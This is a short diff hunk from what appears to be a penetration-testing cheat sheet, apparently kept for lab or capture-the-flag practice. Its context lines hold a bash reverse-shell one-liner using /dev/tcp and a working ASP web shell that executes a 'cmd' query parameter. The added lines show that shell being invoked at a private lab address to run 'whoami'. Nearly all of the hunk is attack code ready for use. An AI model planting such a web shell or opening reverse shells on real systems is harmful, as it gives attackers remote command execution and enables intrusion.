@@ -340,6 +340,9 @@ bash -c "bash -i >& /dev/tcp/IP/port 0>&1"
 
 ```
 <%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
+
+http://10.129.228.122/upload/shell.asp?cmd=whoami
+
 ```
 
 ### Python Fully TTY
